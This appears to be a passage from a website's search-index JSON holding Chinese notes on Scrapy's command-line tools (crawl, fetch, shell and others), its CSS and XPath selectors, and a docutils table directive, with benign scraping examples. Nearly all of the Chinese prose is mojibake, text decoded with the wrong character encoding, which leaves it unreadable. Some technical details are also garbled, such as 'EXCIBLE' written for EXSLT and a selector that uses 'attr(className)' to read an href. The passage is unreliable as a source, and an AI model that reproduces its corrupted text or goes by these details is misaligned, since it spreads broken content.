* parse_item $ scrapy check [FAILED] first_spider:parse_item >>> 'RetailPricex' field is missing [FAILED] first_spider:parse >>> Returned 92 requests, expected 0..4","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-check.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-check.html"},{"title":"crawl","text":"ä¾èµ–é¡¹ç›®ç›®å½• è¿è¡ŒæŒ‡å®šçš„çˆ¬è™«: scrapy crawl [options] $spiderName æ”¯æŒoption --overwrite-output FILE , -O FILE å°†è¾“å‡ºå†™å…¥åˆ°æ–‡ä»¶(å¦‚æœæ–‡ä»¶å·²å­˜åœ¨åˆ™è¦†ç›–) dump scraped items into FILE, overwriting any existing file, to define format set a colon at the end of the output URI (i.e. -O FILE:FORMAT ) --output FILE , -o FILE å°† è¾“å‡º å¢åŠ åˆ°file (ä¸ä¼šè¦†ç›–å·²å­˜åœ¨çš„å†…å®¹) ä½†æ˜¯æ–°å¢æ¨¡å¼ä¸æ”¯æŒjson(èƒ½å†™, ä½†æ˜¯æ–‡ä»¶æ ¼å¼å­˜åœ¨é—®é¢˜), å¯ä»¥ä½¿ç”¨ jsonl jsonl JSON Lines æ ¼å¼æµå¼çš„, æ”¯æŒæ–°å¢å†…å®¹æ›´ç®€å•(æ²¡æ‡‚æ„æ€), åŸæ–‡: The JSON Lines format is useful because it's stream-like, you can easily append new records to it. It doesn't have the same problem of JSON when you run twice. æ¯ä¸€ä¸ªè®°å½•æ˜¯ä¸€ä¸ªå•ç‹¬çš„è¡Œ, æ‰€ä»¥å¦‚æœæ–‡ä»¶å¾ˆå¤§çš„æ—¶å€™, å¯ä»¥ç›´æ¥é€è¡Œè¯»å–åˆ†æ. åŸæ–‡: Also, as each record is a separate line, you can process big files without having to fit everything in memory, there are tools like JQ to help do that at the command-line. jsonl å‚è€ƒ https://jsonlines.org -a args è‡ªå®šä¹‰çˆ¬è™«å‚æ•°, æä¾›è‡ªå®šä¹‰å‚æ•°åˆ—è¡¨ç»™çˆ¬è™«. æ ¼å¼: -a NAME=VALUE å¦‚: scrapy crawl quotes -O quotes-humor.json -a tag=humor ä»£ç : import scrapy class QuotesSpider(scrapy.Spider): name = \"quotes\" def start_requests(self): url = \"https://quotes.toscrape.com/\" tag = getattr(self, \"tag\", None) if tag is not None: url = url + \"tag/\" + tag yield scrapy.Request(url, self.parse) def parse(self, response): for quote in response.css(\"div.quote\"): yield { \"text\": quote.css(\"span.text::text\").get(), \"author\": quote.css(\"small.author::text\").get(), } next_page = response.css(\"li.next a::attr(href)\").get() if next_page is not None: yield response.follow(next_page, self.parse) å®é™…å¯»æ‰¾çš„urlå°±æ˜¯: https://quotes.toscrape.com/tag/humor --output-format FORMAT , -t FORMAT å·²ç»åºŸå¼ƒ , å®šä¹‰å½“æ•°æ®è¾“å‡ºæ—¶çš„æ ¼å¼, ä¸èƒ½äº -O ä¸€èµ·ç”¨ -h , --help å¸®åŠ©æ¶ˆæ¯ spiderName ä¸ºå®šä¹‰åœ¨ spiders ç›®å½•ä¸‹çš„å…·ä½“çš„çˆ¬è™«name () å¦‚: scrapy crawl itcast -O t.json å¦‚: $ scrapy crawl myspider [ ... myspider starts crawling ... ] $ scrapy crawl -o myfile:csv myspider [ ... myspider starts crawling and appends the result to the file myfile in csv format ... ] $ scrapy crawl -O myfile:json myspider [ ... myspider starts crawling and saves the result in myfile in json format overwriting the original content... ] $ scrapy crawl -o myfile -t csv myspider [ ... myspider starts crawling and appends the result to the file myfile in csv format ... ]","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-crawl.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-crawl.html"},{"title":"edit","text":"ä¾èµ–é¡¹ç›®ç›®å½• è¯­æ³•: scrapy edit <spider> ä½¿ç”¨ EDITOR ç¯å¢ƒå˜é‡æŒ‡å®šçš„ç¼–è¾‘å™¨(æ²¡æœ‰å°±ç”¨é…ç½®çš„ EDITOR), æ¥ç¼–è¾‘æŒ‡å®šçš„çˆ¬è™« ä»…æ˜¯ä¸€ä¸ªä¾¿æ·çš„ä¿®æ”¹æ–¹å¼","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-edit.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-edit.html"},{"title":"fetch","text":"ä¸ä¾èµ–é¡¹ç›®ç›®å½• è¯­æ³•: scrapy fetch <url> ä½¿ç”¨ Scrapy downloader ä¸‹è½½ç»™å®šçš„URL, ä¸‹è½½ç»“æœåœ¨æ ‡å‡†è¾“å‡º å¦‚æœåœ¨é¡¹ç›®å†…, ä¸çˆ¬è™«è·å–åˆ°çš„é¡µé¢æ˜¯ä¸€è‡´çš„(ä¼šä½¿ç”¨é…ç½®çš„å±æ€§å¦‚ USER-AGENT) å¦‚æœåœ¨å…¶ä»–ç›®å½•, ä½¿ç”¨é»˜è®¤çš„é…ç½®å±æ€§ æ”¯æŒé€‰é¡¹ --spider= SPIDER æŒ‡å®šæ‰§è¡Œçš„çˆ¬è™«, æ²¡æœ‰å°±è‡ªåŠ¨æ¢æµ‹ --headers æ‰“å° HTTP å“åº”çš„æ¶ˆæ¯å¤´, è€Œä¸æ˜¯æ‰“å° body --no-redirect å¦‚æœè·å–æ¶ˆæ¯æ—¶, é‡åˆ° 3xx çš„é‡å®šå‘, å°±æ”¾å¼ƒ(é»˜è®¤ä¼šè·Ÿç€é‡å®šå‘åˆ°æ–°åœ°å€) Usage examples: $ scrapy fetch --nolog http://www.example.com/some/page.html [ ... html content here ... ] $ scrapy fetch --nolog --headers http://www.example.com/ {'Accept-Ranges': ['bytes'], 'Age': ['1263 '], 'Connection': ['close '], 'Content-Length': ['596'], 'Content-Type': ['text/html; charset=UTF-8'], 'Date': ['Wed, 18 Aug 2010 23:59:46 GMT'], 'Etag': ['\"573c1-254-48c9c87349680\"'], 'Last-Modified': ['Fri, 30 Jul 2010 15:30:18 GMT'], 'Server': ['Apache/2.2.3 (CentOS)']}","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-fetch.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-fetch.html"},{"title":"list","text":"ä¾èµ–é¡¹ç›®ç›®å½• åˆ—å‡ºæ‰€æœ‰çš„çˆ¬è™«, ä»¥è¡Œä¸ºåˆ†éš”ç¬¦. è¯­æ³•: scrapy list ç”¨ä¾‹: $ scrapy list spider1 spider2","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-list.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-list.html"},{"title":"runspider","text":"ä¸ä¾èµ–é¡¹ç›®ç›®å½• è¯­æ³•: scrapy runspider <spider_file.py> å°†ç›®å½•ä¸‹çš„å•ä¸ªPythonæ–‡ä»¶è§†ä½œçˆ¬è™«, è¿è¡Œ Example usage: $ scrapy runspider myspider.py [ ... spider starts crawling ... ]","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-runspider.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-runspider.html"},{"title":"shell","text":"ä¸ä¾èµ–é¡¹ç›®ç›®å½• å¯åŠ¨ä¸€ä¸ªäº¤äº’å¼çš„çˆ¬è™«ç»ˆç«¯, å¦‚æœæœ‰ipythonå°±ä¼šç”¨ipython: scrapy shell $url å¯åŠ¨æˆåŠŸå, åœ¨å½“å‰ç¯å¢ƒä¼šæœ‰ä¸€ä¸ª response å˜é‡, ä»£è¡¨çˆ¬è™«çš„å“åº”, ä¸çˆ¬è™«ç±» parse æ–¹æ³•çš„ç¬¬ä¸€ä¸ª response å‚æ•°ä¸€è‡´. æ”¯æŒé€‰é¡¹ --spider= SPIDER ä½¿ç”¨æŒ‡å®šçˆ¬è™«çš„url -c code æ‰§è¡ŒæŒ‡å®šçš„ä»£ç å¹¶è¾“å‡º --no-redirect ä¸é‡å®šå‘ Usage example: $ scrapy shell http://www.example.com/some/page.html [ ... scrapy shell starts ... ] $ scrapy shell --nolog http://www.example.com/ -c '(response.status, response.url)' (200, 'http://www.example.com/') # shell follows HTTP redirects by default $ scrapy shell --nolog http://httpbin.org/redirect-to?url=http%3A%2F%2Fexample.com%2F -c '(response.status, response.url)' (200, 'http://example.com/') # you can disable this with --no-redirect # (only for the URL passed as command line argument) $ scrapy shell --no-redirect --nolog http://httpbin.org/redirect-to?url=http%3A%2F%2Fexample.com%2F -c '(response.status, response.url)' (302, 'http://httpbin.org/redirect-to?url=http%3A%2F%2Fexample.com%2F')","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-shell.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-shell.html"},{"title":"version","text":"ä¸ä¾èµ–é¡¹ç›®ç›®å½• è¯­æ³•: scrapy version [-v] æ‰“å° Scrapy ç‰ˆæœ¬ä¿¡æ¯. -v è¿˜ä¼šé¢å¤–è¾“å‡º Python, Twisted and Platform ä¿¡æ¯","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-version.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-version.html"},{"title":"CSSé€‰æ‹©å™¨","text":"ä¸»è¦æ˜¯ç”¨æ³•. æ¦‚è¿°: ::text è·å–æ–‡æœ¬ ::attr(å±æ€§å) è·å–æŒ‡å®šå±æ€§ *::text * è¡¨ç¤ºæ‰€æœ‰, å³è·å–æ‰€æœ‰æ–‡æœ¬ æ¯”å¦‚æœ‰: å¦‚æœ‰ä»¥ä¸‹HTML:: <!DOCTYPE html> <html> <head> <base href='http://example.com/' /> <title>Example website</title> </head> <body> <div id='images'> <a href='image1.html'>Name: My image 1 <br /><img src='image1_thumb.jpg' alt='image1'/></a> <a href='image2.html'>Name: My image 2 <br /><img src='image2_thumb.jpg' alt='image2'/></a> <a href='image3.html'>Name: My image 3 <br /><img src='image3_thumb.jpg' alt='image3'/></a> <a href='image4.html'>Name: My image 4 <br /><img src='image4_thumb.jpg' alt='image4'/></a> <a href='image5.html'>Name: My image 5 <br /><img src='image5_thumb.jpg' alt='image5'/></a> </div> </body> </html> é€‰æ‹©titleçš„å†…å®¹: title::text è·å– href: html head base::attr(className) è·å–æ‰€æœ‰ image ä¸‹çš„æ–‡æœ¬: #images *::text åœ¨ä»£ç ä¸­å°±æ˜¯: >>> response.css(\"#images *::text\").getall() ['\\n ', 'Name: My image 1 ', '\\n ', 'Name: My image 2 ', '\\n ', 'Name: My image 3 ', '\\n ', 'Name: My image 4 ', '\\n ', 'Name: My image 5 ', '\\n ']","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Selector-CSS-selector.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Selector-CSS-selector.html"},{"title":"XPathé€‰æ‹©å™¨","text":"XPath å‚è€ƒ /docs/åç«¯/python/æ•™ç¨‹/xpath/index æ¦‚è¿°: text() è·å–æ–‡æœ¬ @å±æ€§å è·å–æŒ‡å®šå±æ€§, ä¸è·Ÿè¡¨è¾¾å¼ä»…è¡¨ç¤ºå­˜åœ¨å½“å‰å±æ€§ has-class æ˜¯å¦åŒ…å«æŒ‡å®šclass has-class(\"cl1\") æ˜¯å¦åŒ…å« classå±æ€§ cl1 (ä»…Scrapyæ”¯æŒ) å¦‚æœ‰ä»¥ä¸‹HTML: <!DOCTYPE html> <html> <head> <base href='http://example.com/' /> <title>Example website</title> </head> <body> <div id='images'> <a href='image1.html'>Name: My image 1 <br /><img src='image1_thumb.jpg' alt='image1'/></a> <a href='image2.html'>Name: My image 2 <br /><img src='image2_thumb.jpg' alt='image2'/></a> <a href='image3.html'>Name: My image 3 <br /><img src='image3_thumb.jpg' alt='image3'/></a> <a href='image4.html'>Name: My image 4 <br /><img src='image4_thumb.jpg' alt='image4'/></a> <a href='image5.html'>Name: My image 5 <br /><img src='image5_thumb.jpg' alt='image5'/></a> </div> <div class='cl1 cl2'> Name: My image 5 <br /> <img src='image5_thumb.jpg' alt='image5'/> </div> </body> </html> é€‰æ‹©titleçš„å†…å®¹: //title/text() è·å–æ‰€æœ‰ a æ ‡ç­¾çš„å†…å®¹: //div[@id=\"images\"]/a/text() åŒ…å«ä½¿ç”¨ contains contains(@id, \"images\") æ¯”å¦‚æœ‰å¤šä¸ªclasså±æ€§çš„æ—¶å€™, =æ˜¯ä¸æˆç«‹çš„, åªå¥½ç”¨ contains, å‚è€ƒ XpathContain : //div[contains(@class, \"cl1\")]/img/@src å¯ä»¥å‘ç°ä½¿ç”¨ contains æ˜¯æ¯”è¾ƒéº»çƒ¦çš„, ä¸”ä¸æ˜“å…¼å®¹æ‰€æœ‰æƒ…å†µ, æ‰€ä»¥æœ‰æ—¶è¿˜æ˜¯ä½¿ç”¨ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/Scrapy/é€‰æ‹©å™¨/CSSé€‰æ‹©å™¨ æ›´ç®€å•: .css(\"div.cl1\").xpath(\"./img/@src\") å¯å‚è€ƒ /docs/åç«¯/python/æ•™ç¨‹/xpath/XPathè¿ç®—ç¬¦ åŠ ä¸åŠ æ‹¬å·çš„åŒºåˆ« ä¸¾ä¾‹: <ul class=\"list\"> <li>1</li> <li>2</li> <li>3</li> </ul> <ul class=\"list\"> <li>4</li> <li>5</li> <li>6</li> </ul> ä¸åŠ æ‹¬å·(é€‰æ‹©æ‰€æœ‰ç»„èŠ‚ç‚¹): //li[1] //ul/li[1] # ç»“æœéƒ½æ˜¯ ['<li>1</li>', '<li>4</li>'] åŠ æ‹¬å·(å°†æ‰€æœ‰ç»„åˆå¹¶ä¸€ä¸ªç»„): (//li)[1] (//ul/li)[1] # ç»“æœéƒ½æ˜¯ ['<li>1</li>'] æ¡ä»¶è¡¨è¾¾å¼ä¸‹ä½¿ç”¨text åº”è¯¥é¿å…ç›´æ¥ä½¿ç”¨: .//text() è€Œæ˜¯ä½¿ç”¨: . å› ä¸ºå‰è€…åœ¨Scrapyæ¡†æ¶ä¼šè¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰textæ–‡æœ¬çš„ç”Ÿæˆå™¨ç»“æœé›†(yield []), ç„¶åå½“å…¶ä½œä¸ºå‚æ•°ä¼ é€’ç»™ strçš„å‡½æ•°æ¯”å¦‚ contains(), starts-with(), åªä¼šè¿”å›ç¬¬ä¸€ä¸ªç»“æœ æ¯”å¦‚: >>> from scrapy import Selector >>> sel = Selector( ... text='<a href=\"#\">Click here to go to the <strong>Next Page</strong></a>' ... ) è½¬æ¢ä¸º String çš„ç»“æœé›†: >>> sel.xpath(\"//a//text()\").getall() # take a peek at the node-set ['Click here to go to the ', 'Next Page'] >>> sel.xpath(\"string(//a[1]//text())\").getall() # convert it to string ['Click here to go to the '] è½¬æ¢ä¸ºå­—ç¬¦ä¸²çš„èŠ‚ç‚¹ä¼šä¸¢å¤±åä»£èŠ‚ç‚¹: >>> sel.xpath(\"//a[1]\").getall() # select the first node ['<a href=\"#\">Click here to go to the <strong>Next Page</strong></a>'] >>> sel.xpath(\"string(//a[1])\").getall() # convert it to string, ä¸¢å¤±äº†åä»£ ['Click here to go to the Next Page'] è¿™æ—¶ä½¿ç”¨ .//text() å¾—ä¸åˆ°ä»»ä½•ç»“æœ: >>> sel.xpath(\"//a[contains(.//text(), 'Next Page')]\").getall() [] ä½†å¦‚æœä½¿ç”¨ . , å°±å¯è·å–åˆ°: >>> sel.xpath(\"//a[contains(., 'Next Page')]\").getall() ['<a href=\"#\">Click here to go to the <strong>Next Page</strong></a>'] XPathè¡¨è¾¾å¼å˜é‡ XPath å…è®¸ä½ åœ¨è¡¨è¾¾å¼ä¸­å¼•ç”¨å˜é‡, è¯­æ³•: $varName ä¸SQLç±»ä¼¼, è¿˜æ”¯æŒä½¿ç”¨ ? å ä½ç¬¦, æ¥åšå˜é‡æ›¿æ¢: >>> # `$val` used in the expression, a `val` argument needs to be passed >>> response.xpath(\"//div[@id=$val]/a/text()\", val=\"images\").get() 'Name: My image 1 ' åˆæ¯”å¦‚å¯»æ‰¾ div ä¸‹åŒ…å« 5 ä¸ªå­©å­èŠ‚ç‚¹: >>> response.xpath(\"//div[count(a)=$cnt]/@id\", cnt=5).get() 'images' ä»»ä½•å˜é‡å¿…é¡»ä½¿ç”¨çš„æ—¶å€™å°±ç»™å®šå€¼, å¦åˆ™ä¼šæŠ¥é”™ ValueError: XPath error: exception ç§»é™¤å‘½åç©ºé—´ æœ‰äº›çˆ¬è™«é¡¹ç›®è·å–åˆ°çš„ HTML/XML æ˜¯å­˜åœ¨å‘½åç©ºé—´çš„, ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸å…³æ³¨è¿™ä¸ª, åªæƒ³å¤„ç†å…ƒç´ , æ‰€ä»¥å¯ä»¥ç›´æ¥ç§»é™¤: Selector.remove_namespaces() æ¯”å¦‚ä»¥ä¸‹çš„XML: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <?xml-stylesheet ... <feed xmlns=\"http://www.w3.org/2005/Atom\" xmlns:openSearch=\"http://a9.com/-/spec/opensearchrss/1.0/\" xmlns:blogger=\"http://schemas.google.com/blogger/2008\" xmlns:georss=\"http://www.georss.org/georss\" xmlns:gd=\"http://schemas.google.com/g/2005\" xmlns:thr=\"http://purl.org/syndication/thread/1.0\" xmlns:feedburner=\"http://rssnamespace.org/feedburner/ext/1.0\"> ... æœ‰ä¸€ä¸ªé»˜è®¤çš„ http://www.w3.org/2005/Atom å’Œå…¶ä»–çš„ æ¯”å¦‚ gd:\" prefix for \"http://schemas.google.com/g/2005\" å½“å°è¯•é€‰æ‹© link æ—¶, è·å–ä¸åˆ°ç»“æœ: >>> response.xpath(\"//link\") [] å› ä¸ºå…¶å­˜åœ¨äºé»˜è®¤çš„å‘½åç©ºé—´å†…. ç§»é™¤æ‰å³å¯: >>> response.selector.remove_namespaces() >>> response.xpath(\"//link\") [<Selector query='//link' data='<link rel=\"alternate\" type=\"text/html\" h'>, <Selector query='//link' data='<link rel=\"next\" type=\"application/atom+'>, ... ä¸ºä»€ä¹ˆé»˜è®¤ä¸ç›´æ¥ç§»é™¤? ç§»é™¤å¯¹æ•´ä¸ªæ–‡æ¡£æ‰€æœ‰èŠ‚ç‚¹æ“ä½œ, ä»£ä»·å¤§ å¹¶éæ‰€æœ‰æƒ…å†µä¸‹éƒ½ä¸ä¼šç”¨åˆ° namespace ä½¿ç”¨ EXSLT æ‹“å±• Scrapyé€‰æ‹©å™¨æ„å»ºåœ¨lxmlä¹‹ä¸Šï¼Œæ”¯æŒä¸€äº›EXCIBLEæ‰©å±•ï¼Œ å¹¶å¸¦æœ‰è¿™äº›é¢„æ³¨å†Œçš„å‘½åç©ºé—´ï¼Œå¯ç”¨äºEXCIBLEè¡¨è¾¾å¼ï¼š prefix namespace usage re http://exslt.org/regular-expressions æ­£åˆ™è¡¨è¾¾å¼ set http://exslt.org/sets é›†åˆæ“ä½œ (set manipulation) æ­£åˆ™è¡¨è¾¾å¼æ”¯æŒ é»˜è®¤ XPath æœ‰æä¾›å­—ç¬¦ä¸²çš„ starts-with() å’Œ contains() æ–¹æ³•, ä½†æ˜¯æ›´å¤æ‚çš„åŒ¹é…å°±ä¸è¡Œäº†, è¿™æ—¶å¯ä»¥ç”¨ test() æ–¹æ³• æ¯”å¦‚é€‰æ‹©æŒ‡å®š class çš„ li æ ‡ç­¾ä¸‹çš„ é“¾æ¥: >>> from scrapy import Selector >>> doc = \"\"\" ... <div> ... <ul> ... <li class=\"item-0\"><a href=\"link1.html\">first item</a></li> ... <li class=\"item-1\"><a href=\"link2.html\">second item</a></li> ... <li class=\"item-inactive\"><a href=\"link3.html\">third item</a></li> ... <li class=\"item-1\"><a href=\"link4.html\">fourth item</a></li> ... <li class=\"item-0\"><a href=\"link5.html\">fifth item</a></li> ... </ul> ... </div> ... \"\"\" >>> sel = Selector(text=doc, type=\"html\") >>> sel.xpath(\"//li//@href\").getall() ['link1.html', 'link2.html', 'link3.html', 'link4.html', 'link5.html'] >>> sel.xpath('//li[re:test(@class, \"item-\\d$\")]//@href').getall() ['link1.html', 'link2.html', 'link4.html', 'link5.html'] è­¦å‘Š Cåº“çš„ libxslt å¹¶ä¸æä¾› EXSLT çš„æ”¯æŒ, æ‰€ä»¥å®é™…ä¸ŠåŒ¹é…ä½¿ç”¨çš„æ˜¯ Python çš„ /docs/åç«¯/python/pythonæ ‡å‡†åº“/re . æ•…, å­˜åœ¨æ€§èƒ½é—®é¢˜æ˜¯æ— æ³•é¿å…çš„ é›†åˆæ“ä½œ æœ‰æ—¶å€™å¯èƒ½ä¸æƒ³è¦æ–‡æ¡£çš„æŸä¸ªéƒ¨åˆ† æ¯”å¦‚ https://schema.org/Product çš„ä»¥ä¸‹å†…å®¹, å­˜åœ¨ itemscopes å’Œ corresponding itemprops: >>> doc = \"\"\" ... <div itemscope itemtype=\"http://schema.org/Product\"> ... <span itemprop=\"name\">Kenmore White 17\" Microwave</span> ... <img src=\"kenmore-microwave-17in.jpg\" alt='Kenmore 17\" Microwave' /> ... <div itemprop=\"aggregateRating\" ... itemscope itemtype=\"http://schema.org/AggregateRating\"> ... Rated <span itemprop=\"ratingValue\">3.5</span>/5 ... based on <span itemprop=\"reviewCount\">11</span> customer reviews ... </div> ... <div itemprop=\"offers\" itemscope itemtype=\"http://schema.org/Offer\"> ... <span itemprop=\"price\">$55.00</span> ... <link itemprop=\"availability\" href=\"http://schema.org/InStock\" />In stock ... </div> ... Product description: ... <span itemprop=\"description\">0.7 cubic feet countertop microwave. ... Has six preset cooking categories and convenience features like ... Add-A-Minute and Child Lock.</span> ... Customer reviews: ... <div itemprop=\"review\" itemscope itemtype=\"http://schema.org/Review\"> ... <span itemprop=\"name\">Not a happy camper</span> - ... by <span itemprop=\"author\">Ellie</span>, ... <meta itemprop=\"datePublished\" content=\"2011-04-01\">April 1, 2011 ... <div itemprop=\"reviewRating\" itemscope itemtype=\"http://schema.org/Rating\"> ... <meta itemprop=\"worstRating\" content = \"1\"> ... <span itemprop=\"ratingValue\">1</span>/ ... <span itemprop=\"bestRating\">5</span>stars ... </div> ... <span itemprop=\"description\">The lamp burned out and now I have to replace ... it. </span> ... </div> ... <div itemprop=\"review\" itemscope itemtype=\"http://schema.org/Review\"> ... <span itemprop=\"name\">Value purchase</span> - ... by <span itemprop=\"author\">Lucas</span>, ... <meta itemprop=\"datePublished\" content=\"2011-03-25\">March 25, 2011 ... <div itemprop=\"reviewRating\" itemscope itemtype=\"http://schema.org/Rating\"> ... <meta itemprop=\"worstRating\" content = \"1\"/> ... <span itemprop=\"ratingValue\">4</span>/ ... <span itemprop=\"bestRating\">5</span>stars ... </div> ... <span itemprop=\"description\">Great microwave for the price. It is small and ... fits in my apartment.</span> ... </div> ... ... ... </div> ... \"\"\" >>> sel = Selector(text=doc, type=\"html\") >>> for scope in sel.xpath(\"//div[@itemscope]\"): ... print(\"current scope:\", scope.xpath(\"@itemtype\").getall()) ... props = scope.xpath( ... \"\"\" ... set:difference(./descendant::*/@itemprop, ... .//*[@itemscope]/*/@itemprop)\"\"\" ... ) ... print(f\" properties: {props.getall()}\") ... print(\"\") ... current scope: ['http://schema.org/Product'] properties: ['name', 'aggregateRating', 'offers', 'description', 'review', 'review'] current scope: ['http://schema.org/AggregateRating'] properties: ['ratingValue', 'reviewCount'] current scope: ['http://schema.org/Offer'] properties: ['price', 'availability'] current scope: ['http://schema.org/Review'] properties: ['name', 'author', 'datePublished', 'reviewRating', 'description'] current scope: ['http://schema.org/Rating'] properties: ['worstRating', 'ratingValue', 'bestRating'] current scope: ['http://schema.org/Review'] properties: ['name', 'author', 'datePublished', 'reviewRating', 'description'] current scope: ['http://schema.org/Rating'] properties: ['worstRating', 'ratingValue', 'bestRating'] ä¸»è¦æ˜¯: set:difference(./descendant::*/@itemprop, .//*[@itemscope]/*/@itemprop) set:difference è¡¨ç¤ºä½¿ç”¨ä¸€ä¸ªé›†åˆå‡å»å¦ä¸€ä¸ªé›†åˆ, ä¹Ÿå°±æ˜¯: ./descendant::*/@itemprop å‡å»: .//*[@itemscope]/*/@itemprop æ¥åˆ†åˆ«çœ‹åˆ†æè¿™ä¸¤ä¸ªçš„å«ä¹‰: ./descendant::*/@itemprop descendant ç¿»è¯‘è¿‡æ¥å°±æ˜¯åä»£, è¿™é‡Œå°±æ˜¯è¡¨ç¤ºå½“å‰å…ƒç´ çš„æ‰€æœ‰åä»£å…ƒç´ (åä»£, å­™ä»£...), æ€»æ¥è¯´å°±æ˜¯, æ‰€æœ‰åä»£å…ƒç´ çš„ itemprop å±æ€§ .//*[@itemscope]/*/@itemprop é€‰æ‹©æ‰€æœ‰åŒ…å« itemscope å±æ€§çš„ itemprop å±æ€§ æ•´ä¸ªè¡¨è¾¾å¼çš„å«ä¹‰æ˜¯é€‰æ‹©å½“å‰èŠ‚ç‚¹çš„æ‰€æœ‰åä»£èŠ‚ç‚¹ä¸­å…·æœ‰ itemprop å±æ€§çš„å±æ€§èŠ‚ç‚¹ï¼Œ ç„¶åä»ä¸­æ’é™¤å½“å‰èŠ‚ç‚¹ä¸‹å…·æœ‰ itemscope å±æ€§çš„å…ƒç´ èŠ‚ç‚¹çš„å­èŠ‚ç‚¹ä¸­çš„ itemprop å±æ€§èŠ‚ç‚¹ï¼Œ æœ€åè¿”å›å‰©ä½™çš„å…ƒç´ èŠ‚ç‚¹é›†åˆ å…¶ä»– XPath æ‹“å±• Scrapy é€‰æ‹©å™¨ è¿˜æä¾›äº† has-class , å¯ç”¨äºåˆ¤æ–­æ˜¯å¦åŒ…å« class å±æ€§, å¯¹äºHTML: >>> from scrapy.http import HtmlResponse >>> response = HtmlResponse( ... url=\"http://example.com\", ... body=\"\"\" ... <html> ... <body> ... <p class=\"foo bar-baz\">First</p> ... <p class=\"foo\">Second</p> ... <p class=\"bar\">Third</p> ... <p>Fourth</p> ... </body> ... </html> ... \"\"\", ... encoding=\"utf-8\", ... ) è¿™æ ·ç”¨: >>> response.xpath('//p[has-class(\"foo\")]') [<Selector query='//p[has-class(\"foo\")]' data='<p class=\"foo bar-baz\">First</p>'>, <Selector query='//p[has-class(\"foo\")]' data='<p class=\"foo\">Second</p>'>] >>> response.xpath('//p[has-class(\"foo\", \"bar-baz\")]') [<Selector query='//p[has-class(\"foo\", \"bar-baz\")]' data='<p class=\"foo bar-baz\">First</p>'>] >>> response.xpath('//p[has-class(\"foo\", \"bar\")]') [] å…¶ä¸­: //p[has-class(\"foo\", \"bar-baz\")] ç›¸å½“äº CSSçš„: p.foo.bar-baz æ³¨è§£ has-class å…¶å®æ€§èƒ½æ˜¯æ¯”è¾ƒæ…¢çš„, å› ä¸ºå®ƒæ˜¯ä¸€ä¸ªçº¯ Python å‡½æ•°. æ•…å»ºè®®ä»…é€‚ç”¨äº, CSSé€‰æ‹©å™¨ä¸å®¹æ˜“æè¿°çš„æƒ…å†µä¸‹ æ·»åŠ è‡ªå®šä¹‰ Python æ–¹æ³• API: parsel.xpathfuncs.set_xpathfunc(fname: str, func: Optional[Callable]) -> None[source] ç”¨äºæ³¨å†Œè‡ªå®šä¹‰ XPath è¡¨è¾¾å¼æ–¹æ³• Register a custom extension function to use in XPath expressions. fname æ–¹æ³•å func å…·ä½“çš„æ‰§è¡Œæ–¹æ³•, ä¸ºNoneå›æ³¨å†Œå¤±è´¥","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Selector-XPath-selector.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Selector-XPath-selector.html"},{"title":"tables","text":"å‚è€ƒ: https://docutils.sourceforge.io/docs/ref/rst/directives.html#tables table è¡¨æ ¼ æ”¯æŒå‘½ä»¤é€‰é¡¹: align: \"left\", \"center\", or \"right\" æ°´å¹³å¯¹é½æ–¹å¼ width: length or percentage å°†è¡¨çš„å®½åº¦è®¾ç½®ä¸ºæŒ‡å®šé•¿åº¦æˆ–è¡Œå®½åº¦çš„ç™¾åˆ†æ¯”ã€‚å¦‚æœçœç•¥ï¼Œæ¸²æŸ“å™¨å°†æ ¹æ®å…¶å†…å®¹æˆ–åˆ—å®½åº¦æ¥ç¡®å®šè¡¨çš„å®½åº¦ã€‚ widths: \"auto\", \"grid\", or a list of integers æ˜ç¡®è®¾ç½®åˆ—å®½åº¦ã€‚å¦‚æœä¸å®½åº¦é€‰é¡¹ä¸€èµ·ä½¿ç”¨ï¼Œåˆ™æŒ‡å®šç›¸å¯¹å®½åº¦ã€‚è¦†ç›–table_styleè®¾ç½®æˆ–ç±»å€¼\"colwidths-auto\"ã€‚é»˜è®¤å€¼å–å†³äºtable_styleé…ç½®è®¾ç½®ã€‚ \"auto\"å°†åˆ—å®½åº¦çš„ç¡®å®šå§”æ‰˜ç»™åç«¯ï¼ˆLaTeXï¼ŒHTMLæµè§ˆå™¨ï¼Œ...ï¼‰ã€‚é»˜è®¤Html5 \"grid\"æ ¹æ®è¾“å…¥åˆ—çš„å®½åº¦ï¼ˆä»¥å­—ç¬¦ä¸ºå•ä½ï¼‰ç¡®å®šåˆ—å®½åº¦ã€‚è¿™ä¸ªæ²¡æ€ä¹ˆæ‡‚. æºç : .. table:: Truth table for \"not\" :width: 30% ===== ===== A not A ===== ===== False True True False ===== ===== 